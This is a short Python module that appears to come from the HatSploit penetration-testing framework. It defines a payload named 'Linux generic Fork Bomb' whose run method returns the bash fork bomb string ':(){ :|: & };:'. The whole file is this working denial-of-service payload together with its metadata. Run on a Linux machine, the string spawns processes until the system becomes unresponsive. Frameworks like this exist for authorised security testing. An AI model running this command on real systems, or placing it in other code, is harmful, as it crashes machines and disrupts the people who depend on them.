#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "singler",
        'Name': "Linux generic Fork Bomb",
        'Payload': "linux/generic/fork_bomb",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Linux generic fork bomb.",
        'Architecture': "generic",
        'Platform': "linux",
        'Rank': "high",
        'Type': "one_side"
    }

    def run(self):
        return ':(){ :|: & };:'
